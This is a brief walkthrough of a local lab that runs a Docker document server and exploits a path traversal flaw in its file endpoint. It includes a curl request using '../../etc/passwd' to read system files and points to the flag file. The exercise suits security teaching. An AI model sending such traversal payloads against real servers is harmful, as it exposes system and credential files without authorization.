# Finding the Bug

Start the lab and list the available files:

```bash
docker compose up --build -d
curl http://localhost:8082/
```

Output:
```json
{
  "service": "Document Server v1.0",
  "docs": ["readme.txt", "policy.txt", "report.txt"],
  "endpoint": "GET /file?name=<filename>"
}
```

Read a legitimate file:

```bash
curl "http://localhost:8082/file?name=readme.txt"
```

Output:
```
Welcome to the document server.
```

The endpoint reads whatever filename is supplied. There is no sanitization visible in the response: the server returns the raw file contents. Any path the server process can open is a valid target.

Try a simple traversal:

```bash
curl "http://localhost:8082/file?name=../../etc/passwd"
```

If the response contains `root:x:0:0:`, the server walked outside its document root. The flag is at `/flag.txt`.
